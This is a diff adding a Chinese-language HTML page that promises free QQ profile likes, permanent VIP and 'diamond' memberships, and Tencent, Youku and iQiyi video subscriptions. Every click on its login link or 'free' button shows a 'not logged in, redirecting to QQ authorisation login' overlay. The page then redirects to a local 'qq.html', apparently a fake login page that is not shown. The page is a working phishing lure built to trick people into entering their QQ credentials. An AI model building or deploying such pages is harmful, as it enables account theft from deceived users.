@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>免费领取名片-刷永久会员</title>
+        <style>
+        html,body{
+            margin:0;padding:0;width:100%;height:100%;
+        }
+        
+        .s1{
+            width:100%;height:120px;background:yellow;box-shadow:4px 4px 30px #c5c5c2;
+            
+        }
+        .s2,.s3,.s4,.s5{
+            width:85%;box-shadow:3px 3px 18px #c5c5c2;background:#fff;margin:auto;margin-top:40px;
+            
+        }
+        
+        .s2 p{font-size:40px;margin-left:32%;}
+        .s3 p{font-size:40px;margin-left:22%;}
+        .s4 p{font-size:40px;margin-left:17%;}
+        .s5 p{font-size:40px;margin-left:10%;}
+        
+        .s2 input{width:25px;height:25px;margin-left:15%;margin-bottom:50px;}
+        .s3 input{width:25px;height:25px;margin-left:5%;margin-bottom:50px;}
+        .s4 input{width:25px;height:25px;margin-left:5%;margin-bottom:50px;}
+        .s5 input{width:25px;height:25px;margin-left:5%;margin-bottom:50px;}
+        
+        .s2,.s3,.s4,.s5 b{font-size:30px;}
+        
+        img{width:100px;height:100px;border-radius:50%;padding-top:11px;}
+        
+        .ss{
+            width:80%;height:120px;background:#4FDC86;box-shadow:4px 4px 30px #c5c5c2;display:block;margin:auto;margin-top:80px;margin-bottom:100px;border:0px;color:#fff;font-size:45px;outline:none; 
+        }
+        .ss:hover{background:#43BA72;}
+        
+        .mask{
+            width:100%;height:2100px;background:rgba(0,0,0,0.5);;z-index:1111111;position:absolute;color:#fff;font-size:60px;display:none;
+            
+        }
+        .mask p{
+            margin-top:900px;margin-left:50px;
+            
+        }
+        </style>
+    </head>
+    <body>
+        <div class="mask"><p>[当前未登录]<br>即将跳转至QQ授权登录界面...</p></div>
+        <div class="s1">
+            <img src="http://192.168.1.102/other/test/sc/static/images/file_icon/icon_others/user.png">
+            <div class="s" style="text-decoration:underline;cursor:pointer;font-size:50px;padding-top:20px;float:right;">点击登录</div>
+            </div>
+        <div class="s2">
+            <p>名片赞【三选一】</p>
+            <input type="radio" name="field_name" checked><b>刷取1000名片赞（5小时内必到）</b>
+            <br><input type="radio" name="field_name"><b>刷取10000名片赞（24小时内必到）</b>
+            <br><input type="radio" name="field_name"><b>刷取50000名片赞（48小时内必到，限刷一次）</b>
+        </div>
+        <div class="s3">
+            <p>vip会员/svip会员【四选一】</p>
+            <input type="radio" name="fiel" checked><b>理论永久vip会员，无质保（2小时内必到）</b>
+            <br><input type="radio" name="fiel"><b>理论永久vip会员，质保1个月（5小时内必到，限刷一次）</b>
+            <br><input type="radio" name="fiel"><b>理论永久svip会员，无质保（3小时内必到）</b>
+            <br><input type="radio" name="fiel"><b>理论永久svip会员，质保1个月（8小时内必到，限刷一次）</b>
+        </div>
+        <div class="s4">
+            <p>红钻/绿钻/蓝钻/黄钻【四选一】</p>
+            <input type="radio" name="field" checked><b>理论永久红钻，无质保（5小时内必到）</b>
+            <br><input type="radio" name="feld"><b>理论永久绿钻，无质保（5小时内必到）</b>
+            <br><input type="radio" name="feld"><b>理论永久蓝钻，无质保（5小时内必到）</b>
+            <br><input type="radio" name="feld"><b>理论永久黄钻，质保1个月（8小时内必到，限刷一次）</b>
+        </div>
+        <div class="s5">
+            <p>腾讯/优酷/爱奇艺 影视会员【三选一】</p>
+            <br><input type="radio" checked name="fild"><b>腾讯影视会员6个月（5小时内必到，限刷一次）</b>
+            <br><input type="radio" name="fild"><b>优酷影视会员6个月（5小时内必到，限刷一次）</b>
+            <br><input type="radio" name="fild"><b>爱奇艺影视会员6个月（5小时内必到，限刷一次）</b>
+        </div>
+        <input class="ss" type="button" value="免费刷取 (*´ﾟ∀ﾟ｀)ﾉ ">
+        123
+    </body>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $('.s,.ss').click(function(){
+                $('.mask').css({display:'block'});
+                var timeout=setTimeout(function () {
+           window.location.replace("qq.html");
+                },2000);
+            })
+        })
+    </script>
+</html>
